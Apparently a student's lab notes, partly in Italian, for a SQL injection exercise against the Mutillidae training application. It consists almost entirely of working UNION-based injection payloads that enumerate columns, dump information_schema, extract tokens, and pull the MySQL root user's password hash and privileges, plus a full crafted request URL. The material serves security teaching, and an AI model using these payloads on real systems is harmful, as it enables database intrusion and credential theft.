
# 2. Sql injection

```sql
' ORDER BY 7
' UNION SELECT 
```


**2.2**
```sql
' AND 1=0 UNION SELECT null, COLUMN_NAME, null, null,null, null,null FROM information_schema.columns WHERE table_name="youTubeVideos" -- 

' UNION SELECT null, identificationToken, null,null,null,null,null FROM youTubeVideos -- 


VEDI CHE NON c'è l'ide che il prof cerca

```

**2.3**


ATTENZIONE DEVI GUARDARE USER non USERS


Aggiungi table schema e vedi che ti arriva da quel db
```sql
' UNION SELECT null, COLUMN_NAME, null, null, null, null, null FROM information_schema.columns WHERE table_name="user" -- 

' UNION SELECT null, COLUMN_NAME, table_schema, null, null, null, null FROM information_schema.columns WHERE table_name="user" --

E ottieni http://192.168.122.123/mutillidae/index.php?page=user-info.php&username=%27+UNION+SELECT+null%2C+COLUMN_NAME%2C+table_schema%2C+null%2C+null%2C+null%2C+null+FROM+information_schema.columns+WHERE+table_name%3D%22user%22+--+&password=&user-info-php-submit-button=View+Account+Details


PUOI FARE PIU'


' UNION SELECT null, password_expired, null, null,null,null,null FROM mysql.user -- 


concat per avere concatenare gli input

' UNION SELECT null,CONCAT(Host, " ", User," ",Password," ", Super_priv," ", Show_db_priv," ", Create_user_priv), null ,null,null,null,null FROM mysql.user WHERE User='root' --



```

